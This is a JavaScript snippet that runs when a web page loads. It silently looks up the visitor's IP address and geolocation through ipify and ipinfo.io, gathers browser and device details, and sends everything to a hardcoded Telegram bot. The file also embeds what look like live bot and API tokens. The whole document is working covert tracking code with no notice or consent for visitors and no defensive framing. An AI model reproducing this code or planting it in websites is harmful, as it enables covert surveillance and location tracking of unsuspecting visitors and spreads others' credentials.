window.onload = function () {
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      const ip = data.ip;
      const os = navigator.platform;
      const language = navigator.language;
      const time = new Date().toLocaleString();
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const screenResolution = `${screen.width}x${screen.height}`;

      const botToken = '8090456147:AAEgWuP5awTTHtrokLNqBHGf6yo2PV6vc9A';
      const chatId = '1695105797';

      fetch(`https://ipinfo.io/${ip}?token=3176c341a723fa`)
        .then(response => response.json())
        .then(ipInfo => {
          const country = ipInfo.country;
          const region = ipInfo.region;
          const city = ipInfo.city;
          const org = ipInfo.org;
          const usingVPN = ipInfo.privacy ? ipInfo.privacy.proxy : 'Unknown';
          const deviceType = navigator.userAgent;

          const message = `IP Address = ${ip}%0ACountry = ${country}%0ARegion = ${region}%0ACity = ${city}%0AISP = ${org}%0AUsing VPN = ${usingVPN}%0ADevice Type = ${deviceType}%0AOperating System = ${os}%0ABrowser Language = ${language}%0AVisit Time = ${time}%0ATimezone = ${timezone}%0AScreen Resolution = ${screenResolution}`;

          fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
            .then(response => response.json())
            .then(data => {
              console.log('Telegram message sent:', data);
            })
            .catch(error => {
              console.error('Error sending Telegram message:', error);
            });
        });
    });
};
